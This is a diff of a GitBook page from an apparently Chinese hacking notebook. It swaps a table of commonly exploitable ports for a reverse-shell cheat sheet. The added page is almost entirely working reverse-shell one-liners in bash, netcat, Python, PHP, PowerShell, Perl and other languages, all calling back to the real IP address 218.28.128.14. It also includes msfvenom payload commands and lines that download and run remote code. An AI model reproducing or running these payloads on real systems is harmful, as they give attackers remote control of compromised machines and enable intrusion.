@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>04-常见端口漏洞 · GitBook</title>
+        <title>08-反弹shell · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -69,10 +69,10 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="05-sql注入.html" />
+    <link rel="next" href="10-各厂商登录默认密码.html" />
     
     
-    <link rel="prev" href="03-linux常用命令.html" />
+    <link rel="prev" href="07-webshell.md" />
     
 
     </head>
@@ -636,7 +636,7 @@
             
         </li>
     
-        <li class="chapter active" data-level="4.1.4" data-path="04-常见端口漏洞.html">
+        <li class="chapter " data-level="4.1.4" data-path="04-常见端口漏洞.html">
             
                 <a href="04-常见端口漏洞.html">
             
@@ -688,7 +688,7 @@
             
         </li>
     
-        <li class="chapter " data-level="4.1.8" data-path="08-反弹shell.html">
+        <li class="chapter active" data-level="4.1.8" data-path="08-反弹shell.html">
             
                 <a href="08-反弹shell.html">
             
@@ -1015,7 +1015,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >04-常见端口漏洞</a>
+        <a href=".." >08-反弹shell</a>
     </h1>
 </div>
 
@@ -1030,56 +1030,198 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h2 id="04-&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x6F0F;&#x6D1E;">04-&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x6F0F;&#x6D1E;</h2>
-<h4 id="&#x4E00;&#x3001;&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x6F0F;&#x6D1E;">&#x4E00;&#x3001;&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x6F0F;&#x6D1E;</h4>
-<pre><code>21      FTP         &#x533F;&#x540D;&#x3001;&#x5F31;&#x53E3;&#x4EE4;
-22      SSH         &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-23      Telnet      &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-135     RPC         &#x901A;&#x8FC7;&#x8FDC;&#x7A0B;&#x8C03;&#x7528;&#x6267;&#x884C;&#x4EE3;&#x7801;
-137     NetBIOS     &#x83B7;&#x53D6;&#x76EE;&#x6807;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;
-161     Snmp        public&#x5F31;&#x53E3;&#x4EE4;
-389     ldap        &#x533F;&#x540D;&#x8BBF;&#x95EE;
-443     Openssl     &#x5FC3;&#x810F;&#x6EF4;&#x8840;
-445     Smb         &#x5F31;&#x53E3;&#x4EE4;&#xFF0C;ms_08067&#x7B49;1025
-873     Rsync       &#x533F;&#x540D;&#x8BBF;&#x95EE;&#xFF0C;&#x5F31;&#x53E3;&#x4EE4;
-1099    java rmi    &#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x6267;&#x884C;
-1433    MSSQL       &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-1521    Oracle      &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-2049    Nfs         &#x914D;&#x7F6E;&#x4E0D;&#x5F53;
-2082/2083   Cpanel  &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-2222    DA&#x865A;&#x62DF;&#x4E3B;&#x673A;  &#x9ED8;&#x8BA4;&#x5BC6;&#x7801;zebra
-2601/2604   zebra&#x8DEF;&#x7531;&#x5668; &#x8BF4;&#x660E;
-3128    Squid&#x4EE3;&#x7406;&#x7AEF;&#x53E3;   &#x6CA1;&#x8BBE;&#x7F6E;&#x53E3;&#x4EE4;&#xFF0C;&#x53EF;&#x76F4;&#x63A5;&#x5185;&#x7F51;&#x6F2B;&#x6E38;
-3306    Mysql       &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-3312/3311   Kangle&#x4E3B;&#x673A;&#x767B;&#x5F55;  &#x8BF4;&#x660E;
-3389    RDP         &#x5F31;&#x53E3;&#x4EE4;&#x3001;SHIFT&#x540E;&#x95E8;&#x3001;&#x653E;&#x5927;&#x955C;
-4440    Rundeck     web
-4848    GlassFish   web&#x4E2D;&#x95F4;&#x4EF7;&#xFF0C;&#x5F31;&#x53E3;&#x4EE4; &#x5F31;&#x53E3;&#x4EE4;admin/adminadmin
-5432    postgresql  &#x5F31;&#x53E3;&#x4EE4;&#x63D0;&#x6743;
-5632    PyAnywhere  &#x6293;&#x5BC6;&#x7801;&#x3001;&#x4EE3;&#x7801;&#x6267;&#x884C;
-5900/5901/5902  VNC &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-6379    Redis       &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x3001;&#x53CD;&#x5F39;shell
-7001/7002   weblogic    &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-8080    tomcat/jboos    &#x5F31;&#x53E3;&#x4EE4;
-9000    Fcgi        fcgi php&#x547D;&#x4EE4;&#x6267;&#x884C;
-9200    Elasticsearch   &#x4EE3;&#x7801;&#x6267;&#x884C;
-9043    websphere       &#x5F31;&#x53E3;&#x4EE4;&#x7206;&#x7834;
-9090    webshpere&#x63A7;&#x5236;&#x53F0; java&#x53CD;&#x5E8F;&#x5217;&#x5316;
-11211   Memcache        &#x5185;&#x5B58;&#x6CC4;&#x6F0F;
-27017/28017 mongodb     &#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;
-50060/50030 hadoop      web
-</code></pre><h4 id="&#x4E8C;&#x3001;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7AEF;&#x53E3;">&#x4E8C;&#x3001;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7AEF;&#x53E3;</h4>
-<pre><code>&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x4EE5;&#x4E0B;&#x7AEF;&#x53E3;&#xFF1A;
-&#xFF08;1&#xFF09;. HTTP&#x534F;&#x8BAE;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7AEF;&#x53E3;&#x53F7;&#xFF1A;80/8080/3128/8081/9080
-&#xFF08;2&#xFF09;. SOCKS&#x4EE3;&#x7406;&#x534F;&#x8BAE;&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7AEF;&#x53E3;&#x53F7;&#xFF1A;1080
+                                <h2 id="&#x53CD;&#x5F39;shell">&#x53CD;&#x5F39;shell</h2>
+<h4 id="bash-tcp">Bash TCP</h4>
+<pre><code>bash -i &gt;&amp; /dev/tcp/218.28.128.14/443 0&gt;&amp;1
 
-Symantec AV/Filter for MSE ,&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A; 8081&#xFF1B;
-ORACLE EMCTL&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1158&#xFF1B;
-Oracle XDB&#xFF08; XML &#x6570;&#x636E;&#x5E93;&#xFF09;&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;8080&#xFF1B;
-Oracle XDB FTP&#x670D;&#x52A1;&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;2100&#xFF1B;
-MS SQL*SERVER&#x6570;&#x636E;&#x5E93;server&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1433/tcp 1433/udp&#xFF1B;
-MS SQL*SERVER&#x6570;&#x636E;&#x5E93;monitor&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1434/tcp 1434/udp&#xFF1B;
-QQ&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1080/udp
+/bin/bash -i &gt; /dev/tcp/218.28.128.14/443 0&lt;&amp; 2&gt;&amp;1
+
+exec 5&lt;&gt;/dev/tcp/218.28.128.14/443;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
+
+exec /bin/sh 0&lt;/dev/tcp/218.28.128.14/443 1&gt;&amp;0 2&gt;&amp;0
+
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/218.28.128.14/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+</code></pre><h4 id="bash-udp">Bash UDP</h4>
+<pre><code>sh -i &gt;&amp; /dev/udp/218.28.128.14/443 0&gt;&amp;1
+
+&#x76D1;&#x542C;
+nc -u -lvp 443
+</code></pre><h4 id="netcat">Netcat</h4>
+<pre><code>nc -e /bin/sh 218.28.128.14 443
+
+nc -e /bin/bash 218.28.128.14 443
+
+nc -c bash 218.28.128.14 443
+
+mknod backpipe p &amp;&amp; nc 218.28.128.14 443 0&lt;backpipe | /bin/bash 1&gt;backpipe 
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 218.28.128.14 443 &gt;/tmp/f
+
+rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 218.28.128.14 443 0/tmp/p 2&gt;&amp;1
+
+rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 218.28.128.14 443 &gt; f
+
+rm -f x; mknod x p &amp;&amp; nc 218.28.128.14 443 0&lt;x | /bin/bash 1&gt;x
+</code></pre><h4 id="ncat">Ncat</h4>
+<pre><code>ncat 218.28.128.14 443 -e /bin/bash
+
+ncat --udp 218.28.128.14 443 -e /bin/bash
+</code></pre><h4 id="telnet">Telnet</h4>
+<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 218.28.128.14 443 0/tmp/p 2&gt;&amp;1
+
+telnet 218.28.128.14 443 | /bin/bash | telnet 218.28.128.14 444
+
+rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet 218.28.128.14 443 &gt; f
+
+rm -f x; mknod x p &amp;&amp; telnet 218.28.128.14 443 0&lt;x | /bin/bash 1&gt;x
+</code></pre><h4 id="socat">Socat</h4>
+<pre><code>/tmp/socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:218.28.128.14:443
+
+socat tcp-connect:218.28.128.14:443 exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane
+
+socat file:`tty`,raw,echo=0 TCP-L:443
+
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:218.28.128.14:443
+</code></pre><h4 id="perl">Perl</h4>
+<pre><code>perl -e &apos;use Socket;$i=&quot;218.28.128.14&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;
+
+perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;218.28.128.14:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;
+
+Windows only, 
+perl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;218.28.128.14:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;
+</code></pre><h4 id="python">Python</h4>
+<pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;218.28.128.14&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;
+
+export RHOST=&quot;218.28.128.14&quot;;export RPORT=443;python -c &apos;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&apos;
+
+python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;218.28.128.14&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;
+
+ IP v6
+python -c &apos;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&apos;
+
+ Windows only:
+C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&apos;218.28.128.14&apos;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&apos;except&apos;, (), {&apos;__enter__&apos;: lambda self: None, &apos;__exit__&apos;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&apos;try&apos;, (), {&apos;__enter__&apos;: lambda self: None, &apos;__exit__&apos;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&apos;p2s_thread&apos;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&apos;s2p_thread&apos;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&apos;p&apos;] in [(subprocess.Popen([&apos;\\windows\\system32\\cmd.exe&apos;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&apos;s&apos;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&apos;p2s&apos;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&apos;s&apos;].send(__l[&apos;p&apos;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&apos;s&apos;], __l[&apos;p&apos;] in [(s, p)]][0])({}), &apos;p2s&apos;)]][0] for __g[&apos;s2p&apos;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&apos;p&apos;].stdin.write(__l[&apos;data&apos;]), __after())[1] if (len(__l[&apos;data&apos;]) &gt; 0) else __after())(lambda: __this()) for __l[&apos;data&apos;] in [(__l[&apos;s&apos;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&apos;s&apos;], __l[&apos;p&apos;] in [(s, p)]][0])({}), &apos;s2p&apos;)]][0] for __g[&apos;os&apos;] in [(__import__(&apos;os&apos;, __g, __g))]][0] for __g[&apos;socket&apos;] in [(__import__(&apos;socket&apos;, __g, __g))]][0] for __g[&apos;subprocess&apos;] in [(__import__(&apos;subprocess&apos;, __g, __g))]][0] for __g[&apos;threading&apos;] in [(__import__(&apos;threading&apos;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&apos;contextlib&apos;))&quot;
+</code></pre><h4 id="php">PHP</h4>
+<pre><code>php -r &apos;$sock=fsockopen(&quot;218.28.128.14&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
+
+php -r &apos;$s=fsockopen(&quot;218.28.128.14&quot;,443);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&apos;
+
+php -r &apos;$s=fsockopen(&quot;218.28.128.14&quot;,443);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
+
+php -r &apos;$s=fsockopen(&quot;218.28.128.14&quot;,443);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&apos;
+
+php -r &apos;$s=fsockopen(&quot;218.28.128.14&quot;,443);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
+
+php -r &apos;$s=fsockopen(&quot;218.28.128.14&quot;,443);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&apos;
+
+php -r &apos;$s=\&apos;127.0.0.1\&apos;;$p=443;@error_reporting(0);@ini_set(&quot;error_log&quot;,NULL);@ini_set(&quot;log_errors&quot;,0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\&apos;/bin/sh$IFS-i\&apos;,array(array(\&apos;pipe\&apos;,\&apos;r\&apos;),array(\&apos;pipe\&apos;,\&apos;w\&apos;),array(\&apos;pipe\&apos;,\&apos;w\&apos;)),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\&apos;connection/closed\&apos;);if(feof($p[1]))die(\&apos;shell/not/response\&apos;);$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die(&quot;proc_open/disabled&quot;);}}else{die(&quot;not/connect&quot;);}&apos;
+</code></pre><h4 id="ruby">Ruby</h4>
+<pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;218.28.128.14&quot;,443).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;
+
+ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;218.28.128.14&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;
+
+NOTE: Windows only
+ruby -rsocket -e &apos;c=TCPSocket.new(&quot;218.28.128.14&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;
+</code></pre><h4 id="openssl">OpenSSL</h4>
+<pre><code>&#x653B;&#x51FB;&#x8005;
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+
+openssl s_server -quiet -key key.pem -cert cert.pem -port 443
+
+ncat --ssl -vv -l -p 443
+
+ &#x53D7;&#x5BB3;&#x8005;
+mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 218.28.128.14:443 &gt; /tmp/s; rm /tmp/s
+</code></pre><h4 id="powershell">Powershell</h4>
+<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;218.28.128.14&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;218.28.128.14&apos;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
+
+powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&apos;)
+</code></pre><h4 id="awk">Awk</h4>
+<pre><code>awk &apos;BEGIN {s = &quot;/inet/tcp/0/218.28.128.14/443&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&apos; /dev/null
+</code></pre><h4 id="tclsh">TCLsh</h4>
+<pre><code>echo &apos;set s [socket 218.28.128.14 443];while 42 { puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;&apos; | tclsh
+</code></pre><h4 id="java">Java</h4>
+<pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/218.28.128.14/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+
+String host=&quot;127.0.0.1&quot;;
+int port=4444;
+String cmd=&quot;cmd.exe&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+Thread thread = new Thread(){
+public void run(){
+    // Reverse shell here
+    }
+}
+thread.start();
+</code></pre><h4 id="war">War</h4>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=218.28.128.14 LPORT=443 -f war &gt; reverse.war
+strings reverse.war | grep jsp # in order to get the name of the file
+</code></pre><h4 id="lua">Lua</h4>
+<pre><code>Linux only
+lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;218.28.128.14&apos;,&apos;443&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;
+
+Windows and Linux
+lua5.1 -e &apos;local host, port = &quot;218.28.128.14&quot;, 443 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&apos;
+</code></pre><h4 id="nodejs">NodeJS:</h4>
+<pre><code>(function(){
+    var net = require(&quot;net&quot;),
+        cp = require(&quot;child_process&quot;),
+        sh = cp.spawn(&quot;/bin/sh&quot;, []);
+    var client = new net.Socket();
+    client.connect(443, &quot;218.28.128.14&quot;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+require(&apos;child_process&apos;).exec(&apos;nc -e /bin/sh 218.28.128.14 443&apos;)
+
+-var x = global.process.mainModule.require
+-x(&apos;child_process&apos;).exec(&apos;nc 218.28.128.14 443 -e /bin/bash&apos;)
+
+https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
+</code></pre><h4 id="groovy">Groovy</h4>
+<pre><code>String host=&quot;218.28.128.14&quot;;
+int port=443;
+String cmd=&quot;cmd.exe&quot;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+</code></pre><h4 id="meterpreter-shell">Meterpreter Shell</h4>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=218.28.128.14 LPORT=443 -f exe &gt; reverse.exe
+
+msfvenom -p windows/shell_reverse_tcp LHOST=218.28.128.14 LPORT=443 -f exe &gt; reverse.exe
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=218.28.128.14 LPORT=443 -f elf &gt;reverse.elf
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=218.28.128.14 LPORT=443 -f elf &gt;reverse.elf
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&quot;218.28.128.14&quot; LPORT=443 -f elf &gt; shell.elf
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;218.28.128.14&quot; LPORT=443 -f exe &gt; shell.exe
+
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=&quot;218.28.128.14&quot; LPORT=443 -f macho &gt; shell.macho
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&quot;218.28.128.14&quot; LPORT=443 -f asp &gt; shell.asp
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;218.28.128.14&quot; LPORT=443 -f raw &gt; shell.jsp
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&quot;218.28.128.14&quot; LPORT=443 -f war &gt; shell.war
+
+msfvenom -p cmd/unix/reverse_python LHOST=&quot;218.28.128.14&quot; LPORT=443 -f raw &gt; shell.py
+
+msfvenom -p cmd/unix/reverse_bash LHOST=&quot;218.28.128.14&quot; LPORT=443 -f raw &gt; shell.sh
+
+msfvenom -p cmd/unix/reverse_perl LHOST=&quot;218.28.128.14&quot; LPORT=443 -f raw &gt; shell.pl
+</code></pre><h4 id="xterm">Xterm</h4>
+<pre><code>xterm -display 218.28.128.14:1
+Xnest :1
+xhost +targetip
 </code></pre><footer class="page-footer"><span class="copyright">&#x8FC7;&#x6C5F;&#x9F99; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x4EF6;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
 2020-06-13 15:38:27
 </span></footer>
@@ -1109,12 +1251,12 @@ QQ&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1080/udp
 
             
                 
-                <a href="03-linux常用命令.html" class="navigation navigation-prev " aria-label="Previous page: 03-linux常用命令">
+                <a href="07-webshell.md" class="navigation navigation-prev " aria-label="Previous page: 07-webshell">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="05-sql注入.html" class="navigation navigation-next " aria-label="Next page: 05-sql注入">
+                <a href="10-各厂商登录默认密码.html" class="navigation navigation-next " aria-label="Next page: 10-各厂商登录默认密码">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -1125,7 +1267,7 @@ QQ&#xFF0C;&#x9ED8;&#x8BA4;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4E3A;1080/udp
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"04-常见端口漏洞","level":"4.1.4","depth":2,"next":{"title":"05-sql注入","level":"4.1.5","depth":2,"path":"hack/05-sql注入.md","ref":"hack/05-sql注入.md","articles":[]},"previous":{"title":"03-linux常用命令","level":"4.1.3","depth":2,"path":"hack/03-linux常用命令.md","ref":"hack/03-linux常用命令.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["tbfed-pagefooter","expandable-chapters","back-to-top-button","-lunr","livereload"],"pluginsConfig":{"tbfed-pagefooter":{"copyright":"过江龙","modify_label":"该文件修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"livereload":{},"search":{},"lunr":{"maxIndexSize":200000},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"back-to-top-button":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}